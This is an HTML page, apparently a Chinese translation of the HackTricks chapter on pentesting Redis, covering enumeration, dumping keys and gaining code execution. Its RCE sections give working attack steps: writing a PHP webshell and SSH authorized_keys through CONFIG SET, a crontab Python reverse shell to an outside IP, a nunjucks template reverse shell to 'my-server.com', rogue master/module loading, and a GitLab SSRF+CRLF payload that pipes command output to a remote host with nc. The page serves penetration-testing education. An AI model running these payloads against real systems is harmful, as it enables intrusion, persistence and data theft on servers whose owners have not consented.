<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>6379 - Pentesting Redis</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="6379---pentesting-redis"><a class="header" href="#6379---pentesting-redis">6379 - Pentesting Redis</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金计划和重要平台更新</p>
<p><strong>今天就加入我们的</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，与顶尖黑客开始合作吧！</p>
<h2 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h2>
<p>来自 <a href="https://redis.io/topics/introduction">the docs</a>：Redis 是一个开源（BSD 许可），内存中的 <strong>数据结构存储</strong>，用作 <strong>数据库</strong>、缓存和消息代理。</p>
<p>默认情况下，Redis 使用基于纯文本的协议，但您必须记住它也可以实现 <strong>ssl/tls</strong>。了解如何 <a href="https://fossies.org/linux/redis/TLS.md">在这里运行带有 ssl/tls 的 Redis</a>。</p>
<p><strong>默认端口：</strong> 6379</p>
<pre><code>PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
</code></pre>
<h2 id="自动枚举"><a class="header" href="#自动枚举">自动枚举</a></h2>
<p>一些可以帮助从 Redis 实例获取信息的自动化工具：</p>
<pre><code class="language-bash">nmap --script redis-info -sV -p 6379 &lt;IP&gt;
msf&gt; use auxiliary/scanner/redis/redis_server
</code></pre>
<h2 id="手动枚举"><a class="header" href="#手动枚举">手动枚举</a></h2>
<h3 id="横幅"><a class="header" href="#横幅">横幅</a></h3>
<p>Redis 是一个 <strong>基于文本的协议</strong>，你可以直接 <strong>在套接字中发送命令</strong>，返回的值将是可读的。还要记住，Redis 可以使用 <strong>ssl/tls</strong> 运行（但这很奇怪）。</p>
<p>在一个常规的 Redis 实例中，你可以直接使用 <code>nc</code> 连接，或者你也可以使用 <code>redis-cli</code>：</p>
<pre><code class="language-bash">nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
</code></pre>
<p>您可以尝试的<strong>第一个命令</strong>是**<code>info</code><strong>。它</strong>可能返回包含<strong>Redis实例</strong>信息的输出**，<strong>或者返回类似以下内容</strong>：</p>
<pre><code>-NOAUTH Authentication required.
</code></pre>
<p>在这种情况下，这意味着<strong>您需要有效的凭据</strong>才能访问Redis实例。</p>
<h3 id="redis身份验证"><a class="header" href="#redis身份验证">Redis身份验证</a></h3>
<p><strong>默认情况下</strong>，Redis可以<strong>不需要凭据</strong>进行访问。然而，它可以被<strong>配置</strong>为仅支持<strong>密码或用户名 + 密码</strong>。<br />
可以在_<strong>redis.conf</strong><em>文件中使用参数<code>requirepass</code><strong>设置密码</strong>，<strong>或临时</strong>，直到服务重启，连接到它并运行：<code>config set requirepass p@ss$12E45</code>。<br />
此外，可以在</em><strong>redis.conf</strong>_文件中的参数<code>masteruser</code>中配置<strong>用户名</strong>。</p>
<p>{% hint style="info" %}
如果仅配置了密码，则使用的用户名是"<strong>default</strong>"。<br />
另外，请注意，<strong>没有办法从外部找到</strong>Redis是否仅配置了密码或用户名+密码。
{% endhint %}</p>
<p>在这种情况下，您将<strong>需要找到有效的凭据</strong>以与Redis交互，因此您可以尝试<a href="../generic-hacking/brute-force.html#redis"><strong>暴力破解</strong></a>。<br />
<strong>如果您找到了有效的凭据，您需要在建立连接后使用以下命令进行身份验证</strong>：</p>
<pre><code class="language-bash">AUTH &lt;username&gt; &lt;password&gt;
</code></pre>
<p><strong>有效凭据</strong>将会返回： <code>+OK</code></p>
<h3 id="认证枚举"><a class="header" href="#认证枚举"><strong>认证枚举</strong></a></h3>
<p>如果 Redis 服务器允许 <strong>匿名连接</strong> 或者您已获得有效凭据，您可以使用以下 <strong>命令</strong> 启动服务的枚举过程：</p>
<pre><code class="language-bash">INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
</code></pre>
<p><strong>其他 Redis 命令</strong> <a href="https://redis.io/topics/data-types-intro"><strong>可以在这里找到</strong></a> <strong>和</strong> <a href="https://lzone.de/cheat-sheet/Redis"><strong>这里</strong></a><strong>.</strong></p>
<p>请注意，<strong>实例的 Redis 命令可以在 <em>redis.conf</em> 文件中重命名或删除</strong>。例如，这一行将删除命令 FLUSHDB:</p>
<pre><code>rename-command FLUSHDB ""
</code></pre>
<p>有关安全配置Redis服务的更多信息，请访问：<a href="https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04">https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04</a></p>
<p>您还可以使用命令**<code>monitor</code><strong>实时</strong>监控Redis命令<strong>的执行，或使用</strong><code>slowlog get 25</code><strong>获取</strong>25个最慢的查询**。</p>
<p>在这里找到更多有趣的Redis命令信息：<a href="https://lzone.de/cheat-sheet/Redis">https://lzone.de/cheat-sheet/Redis</a></p>
<h3 id="转储数据库"><a class="header" href="#转储数据库"><strong>转储数据库</strong></a></h3>
<p>在Redis中，<strong>数据库是从0开始的数字</strong>。您可以在命令<code>info</code>的输出中找到是否有人在“Keyspace”块中使用：</p>
<p><img src="../.gitbook/assets/image%20(766).png" alt="" /></p>
<p>或者您可以通过以下方式获取所有<strong>键空间</strong>（数据库）：</p>
<pre><code>INFO keyspace
</code></pre>
<p>在这个例子中，<strong>数据库 0 和 1</strong> 正在被使用。<strong>数据库 0 包含 4 个键，而数据库 1 包含 1 个</strong>。默认情况下，Redis 将使用数据库 0。为了导出例如数据库 1，您需要执行：</p>
<pre><code class="language-bash">SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET &lt;KEY&gt;
[ ... Get Key ... ]
</code></pre>
<p>如果在运行 <code>GET &lt;KEY&gt;</code> 时出现以下错误 <code>-WRONGTYPE Operation against a key holding the wrong kind of value</code>，这可能是因为该键的类型不是字符串或整数，并且需要特殊操作符来显示它。</p>
<p>要知道键的类型，请使用 <code>TYPE</code> 命令，下面是列表和哈希键的示例。</p>
<pre><code class="language-bash">TYPE &lt;KEY&gt;
[ ... Type of the Key ... ]
LRANGE &lt;KEY&gt; 0 -1
[ ... Get list items ... ]
HGET &lt;KEY&gt; &lt;FIELD&gt;
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP &lt;key&gt;
</code></pre>
<p><strong>使用 npm 导出数据库</strong><a href="https://www.npmjs.com/package/redis-dump"> <strong>redis-dump</strong></a> <strong>或 python</strong> <a href="https://pypi.org/project/redis-utils/"><strong>redis-utils</strong></a></p>
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金计划和重要平台更新</p>
<p><strong>加入我们</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，今天就开始与顶级黑客合作！</p>
<h2 id="redis-rce"><a class="header" href="#redis-rce">Redis RCE</a></h2>
<h3 id="交互式-shell"><a class="header" href="#交互式-shell">交互式 Shell</a></h3>
<p><a href="https://github.com/n0b0dyCN/redis-rogue-server"><strong>redis-rogue-server</strong></a> 可以在 Redis(&lt;=5.0.5) 中自动获取交互式 shell 或反向 shell。</p>
<pre><code>./redis-rogue-server.py --rhost &lt;TARGET_IP&gt; --lhost &lt;ACCACKER_IP&gt;
</code></pre>
<h3 id="php-webshell"><a class="header" href="#php-webshell">PHP Webshell</a></h3>
<p>来自<a href="https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html"><strong>这里</strong></a>的信息。你必须知道<strong>网站文件夹</strong>的<strong>路径</strong>：</p>
<pre><code>root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379&gt; config set dir /usr/share/nginx/html
OK
10.85.0.52:6379&gt; config set dbfilename redis.php
OK
10.85.0.52:6379&gt; set test "&lt;?php phpinfo(); ?&gt;"
OK
10.85.0.52:6379&gt; save
OK
</code></pre>
<p>如果 webshell 访问异常，您可以在备份后清空数据库并重试，记得恢复数据库。</p>
<h3 id="模板-webshell"><a class="header" href="#模板-webshell">模板 Webshell</a></h3>
<p>与前一部分一样，您也可以覆盖一些将被模板引擎解释的 html 模板文件，从而获得一个 shell。</p>
<p>例如，遵循 <a href="https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/"><strong>这篇文章</strong></a>，您可以看到攻击者在 <strong>nunjucks 模板引擎</strong> 解释的 <strong>html</strong> 中注入了一个 <strong>rev shell：</strong></p>
<pre><code class="language-javascript">{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
</code></pre>
<p>{% hint style="warning" %}
注意，<strong>几个模板引擎会在</strong> <strong>内存</strong>中缓存模板，因此即使你覆盖它们，新的模板也<strong>不会被执行</strong>。在这种情况下，开发者要么保持了自动重载的状态，要么你需要对服务进行DoS攻击（并期望它会自动重新启动）。
{% endhint %}</p>
<h3 id="ssh"><a class="header" href="#ssh">SSH</a></h3>
<p>示例 <a href="https://blog.adithyanak.com/oscp-preparation-guide/enumeration">来自这里</a></p>
<p>请注意，<strong><code>config get dir</code></strong> 的结果在其他手动利用命令后可能会改变。建议在登录Redis后立即运行它。在**<code>config get dir</code>** 的输出中，你可以找到<strong>redis用户</strong>的<strong>家目录</strong>（通常是 <em>/var/lib/redis</em> 或 <em>/home/redis/.ssh</em>），知道这一点后，你就知道可以在哪里写入 <code>authenticated_users</code> 文件以通过ssh <strong>以redis用户身份</strong>访问。如果你知道其他有效用户的家目录，并且你有可写权限，你也可以利用它：</p>
<ol>
<li>在你的电脑上生成一个ssh公钥-私钥对：<strong><code>ssh-keygen -t rsa</code></strong></li>
<li>将公钥写入文件：<strong><code>(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") &gt; spaced_key.txt</code></strong></li>
<li>将文件导入redis：<strong><code>cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key</code></strong></li>
<li>将公钥保存到redis服务器上的<strong>authorized_keys</strong>文件中：</li>
</ol>
<pre><code>root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379&gt; config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379&gt; config set dbfilename "authorized_keys"
OK
10.85.0.52:6379&gt; save
OK
</code></pre>
<ol start="5">
<li>最后，你可以使用私钥<strong>ssh</strong>到<strong>redis服务器</strong>：<strong>ssh -i id_rsa redis@10.85.0.52</strong></li>
</ol>
<p><strong>此技术在这里自动化：</strong> <a href="https://github.com/Avinash-acid/Redis-Server-Exploit">https://github.com/Avinash-acid/Redis-Server-Exploit</a></p>
<h3 id="crontab"><a class="header" href="#crontab">Crontab</a></h3>
<pre><code>root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
</code></pre>
<p>最后一个例子是针对 Ubuntu 的，对于 <strong>Centos</strong>，上述命令应该是：<code>redis-cli -h 10.85.0.52 config set dir /var/spool/cron/</code></p>
<p>此方法也可以用来赚取比特币：<a href="https://www.v2ex.com/t/286981#reply14">yam</a></p>
<h3 id="加载-redis-模块"><a class="header" href="#加载-redis-模块">加载 Redis 模块</a></h3>
<ol>
<li>按照 <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a> 的说明，您可以 <strong>编译一个 redis 模块以执行任意命令</strong>。</li>
<li>然后您需要某种方式来 <strong>上传编译好的</strong> 模块。</li>
<li><strong>在运行时加载上传的模块</strong>，使用 <code>MODULE LOAD /path/to/mymodule.so</code>。</li>
<li><strong>列出已加载的模块</strong>，以检查它是否正确加载：<code>MODULE LIST</code>。</li>
<li><strong>执行</strong> <strong>命令</strong>：</li>
</ol>
<pre><code>127.0.0.1:6379&gt; system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379&gt; system.exec "whoami"
"root\n"
127.0.0.1:6379&gt; system.rev 127.0.0.1 9999
</code></pre>
<ol start="6">
<li>随时卸载模块：<code>MODULE UNLOAD mymodule</code></li>
</ol>
<h3 id="lua-沙箱绕过"><a class="header" href="#lua-沙箱绕过">LUA 沙箱绕过</a></h3>
<p><a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html"><strong>这里</strong></a> 您可以看到 Redis 使用命令 <strong>EVAL</strong> 来执行 <strong>Lua 代码沙箱</strong>。在链接的帖子中，您可以看到 <strong>如何滥用它</strong> 使用 <strong>dofile</strong> 函数，但 <a href="https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval">显然</a> 这不再可能。无论如何，如果您可以 <strong>绕过 Lua</strong> 沙箱，您可以 <strong>在系统上执行任意</strong> 命令。此外，从同一帖子中，您可以看到一些 <strong>导致 DoS 的选项</strong>。</p>
<p>一些 <strong>CVE 用于逃避 LUA</strong>：</p>
<ul>
<li><a href="https://github.com/aodsec/CVE-2022-0543">https://github.com/aodsec/CVE-2022-0543</a></li>
</ul>
<h3 id="主从模块"><a class="header" href="#主从模块">主从模块</a></h3>
<p>主 redis 的所有操作会自动同步到从 redis，这意味着我们可以将漏洞 redis 视为一个从 redis，连接到我们自己控制的主 redis，然后我们可以向我们自己的 redis 输入命令。</p>
<pre><code>master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
</code></pre>
<h2 id="ssrf-与-redis-通信"><a class="header" href="#ssrf-与-redis-通信">SSRF 与 Redis 通信</a></h2>
<p>如果您可以发送 <strong>明文</strong> 请求 <strong>到 Redis</strong>，您可以 <strong>与其通信</strong>，因为 Redis 会逐行读取请求，并仅对它不理解的行返回错误：</p>
<pre><code>-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
</code></pre>
<p>因此，如果您在网站中发现了一个 <strong>SSRF vuln</strong>，并且您可以 <strong>控制</strong> 一些 <strong>headers</strong>（可能通过 CRLF vuln）或 <strong>POST 参数</strong>，您将能够向 Redis 发送任意命令。</p>
<h3 id="示例gitlab-ssrf--crlf-到-shell"><a class="header" href="#示例gitlab-ssrf--crlf-到-shell">示例：Gitlab SSRF + CRLF 到 Shell</a></h3>
<p>在 <strong>Gitlab11.4.7</strong> 中发现了一个 <strong>SSRF</strong> 漏洞和一个 <strong>CRLF</strong>。该 <strong>SSRF</strong> 漏洞存在于 <strong>从 URL 导入项目功能</strong> 中，在创建新项目时允许以 [0:0:0:0:0:ffff:127.0.0.1] 的形式访问任意 IP（这将访问 127.0.0.1），而 <strong>CRLF</strong> 漏洞则通过 <strong>在 URL 中添加 %0D%0A</strong> 字符来利用。</p>
<p>因此，可以 <strong>利用这些漏洞与管理来自 gitlab 的队列的 Redis 实例进行通信</strong>，并利用这些队列 <strong>获得代码执行</strong>。Redis 队列滥用有效载荷是：</p>
<pre><code>multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
</code></pre>
<p>并且<strong>URL编码</strong>请求<strong>滥用SSRF</strong>和<strong>CRLF</strong>来执行<code>whoami</code>并通过<code>nc</code>发送回输出的命令是：</p>
<pre><code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
</code></pre>
<p><em>出于某种原因（根据</em> <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/"><em>https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/</em></a> <em>的作者所述），利用<code>git</code>方案而不是<code>http</code>方案的攻击成功了。</em></p>
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金计划和重要平台更新</p>
<p><strong>今天就加入我们的</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，与顶尖黑客开始合作！</p>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/6000-pentesting-x11.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/6000-pentesting-x11.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
